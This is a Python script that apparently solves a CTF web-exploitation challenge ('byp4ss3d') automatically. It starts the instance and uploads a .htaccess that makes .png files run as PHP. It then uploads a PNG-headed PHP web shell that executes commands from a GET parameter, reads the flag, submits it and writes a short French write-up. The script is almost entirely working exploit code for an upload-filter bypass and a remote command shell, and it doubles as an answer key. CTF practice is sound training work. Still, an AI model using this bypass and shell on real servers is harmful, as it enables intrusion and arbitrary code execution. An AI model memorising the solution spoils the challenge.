import sys, json, re, time, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab
import wu

requests.packages.urllib3.disable_warnings()
cy = CyLab(delay=1.2)
cy.login()
FLAG = re.compile(r"(?:academy|picoCTF|PICOCTF)\{[^}]*\}")
cy.req("PUT", "/api/challenges/518/instance/?source=library")
url = None
for _ in range(25):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/518/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        desc = d.get("description") or ""
        cands = [c for c in re.findall(r"https?://[A-Za-z0-9.\-]+\.cylabacademy\.net(?::\d+)?", desc) if "challenge-files" not in c]
        if cands:
            url = cands[0]
            break
print("518:", url)
if url:
    base = url.rstrip("/")
    S = requests.Session()
    S.headers.update({"User-Agent": "Mozilla/5.0"})
    # 1. uploader .htaccess
    r = S.post(base + "/upload.php", files={"image": (".htaccess", b"AddType application/x-httpd-php .png\n", "text/plain")}, timeout=20, verify=False)
    print("htaccess:", re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text or ""))[:100])
    # 2. uploader le shell png
    png = bytes.fromhex("89504e470d0a1a0a")
    php = png + b"\n<?php $o=[]; exec($_GET['cmd'].' 2>&1', $o); echo implode(\"\\n\", $o); ?>"
    r2 = S.post(base + "/upload.php", files={"image": ("s3.php.png", php, "image/png")}, timeout=20, verify=False)
    print("upload:", re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r2.text or ""))[:150])
    time.sleep(1)
    for cmd in ("id", "ls", "cat flag.txt", "cat /flag.txt", "ls /"):
        rr = S.get(base + "/images/s3.php.png", params={"cmd": cmd}, timeout=10, verify=False)
        body = rr.text or ""
        print(f"$ {cmd} -> {body[:200]!r}")
        m = FLAG.search(body)
        if m:
            f = m.group(0)
            print("FLAG:", f)
            st, b = cy.req("POST", "/api/submissions/", {"source": "library", "challenge": 518, "flag": f})
            ok = json.loads(b).get("correct") if b.startswith("{") else None
            print("518 ->", ok)
            if ok:
                wu.write(518, "byp4ss3d", "Web Exploitation", "", "upload .htaccess + shell PNG", f,
                         "Le filtre exige une extension `.png` **dans le nom** et des magic bytes PNG. On "
                         "contourne en uploadant d'abord un `.htaccess` (`AddType application/x-httpd-php "
                         ".png`) dans `images/`, puis un fichier `shell.php.png` contenant du PHP : il est "
                         "alors execute par Apache.")
            break
